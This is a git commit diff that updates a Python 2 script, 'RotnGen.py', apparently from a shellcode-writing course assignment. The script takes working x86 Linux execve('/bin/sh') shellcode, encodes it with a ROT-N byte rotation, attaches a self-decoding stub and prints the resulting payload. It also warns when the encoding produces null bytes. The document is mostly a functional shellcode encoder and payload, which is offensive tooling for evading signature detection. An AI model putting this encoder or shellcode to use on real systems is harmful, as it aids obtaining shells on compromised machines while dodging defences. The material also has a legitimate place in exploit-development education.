4cb296f11bca95be847b92058b96c8b325a0faca
abatchy <abatchy@abatchy.com>
2017-05-03 23:13:13 -0700

    Updated ROT generator

--- Assignment 4/RotnGen.py
+++ Assignment 4/RotnGen.py
@@ -2,29 +2,37 @@
 
 import sys
 
-if len(sys.args) is not 2:
-    print "Usage: {0} N, where N is the number of rotations to be made".format(sys.args[0])
-else 
-    magic = int(sys.args[1])
-    if magic < 1 or magic > 255:
-        print "Invalid number of rotations"
-        exit()
+def parse_args():
+    if len(sys.argv) < 2:
+        print "Usage: {0} N, where N is the number of rotations to be made".format(sys.argv[0])
+        print "[+] Using default value of N = 13"
+        return 13
+    else:
+        x = int(sys.argv[1]) % 256
+        if x < 1:
+            print "[-] Invalid number of rotations"
+            exit()
+        return x
 
-print "Generating ROT-{0} encoded payload".format(magic)
+magic = parse_args()
+rotated_execve = ""
+hasNulls = False
+        
+print "[+] Generating ROT-{0} encoded payload".format(magic)
 
 execvesh = ("\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80")
 
-sc = "\xeb\x09\x5e\x80\x2e" + magic + "\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x3e\xcd\x5d\x96\xef\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x5d\xbd\x18\xda\x8d" + magic
 
-magic = 0
+for i in bytearray(execvesh):
+    j = (i + magic)%256
+    if j == 0:
+        hasNulls = True
+    rotated_execve += '\\x'
+    rotated_execve += '%02x' %j
 
-for i in bytearray(shellcode):
-	j = (i + magic)%256
-	encoded1 += '\\x'
-	encoded1 += '%02x' %j
+sc = "\\xeb\\x09\\x5e\\x80\\x2e" + ("\\x%02x"%magic) + "\\x74\\x08\\x46\\xeb\\xf8\\xe8\\xf2\\xff\\xff\\xff" +rotated_execve + ("\\x%02x"%magic)
 
-	encoded2 += '0x'
-	encoded2 += '%02x, ' %j
+print "[+] Generated shellcode: " + sc
 
-print "Format 1: {0}".format(encoded1)
-print "Format 2: {0}".format(encoded2)
+if hasNulls:
+    print "[-] WARNING: Encoded payload contains at least one null byte, consider changing N"
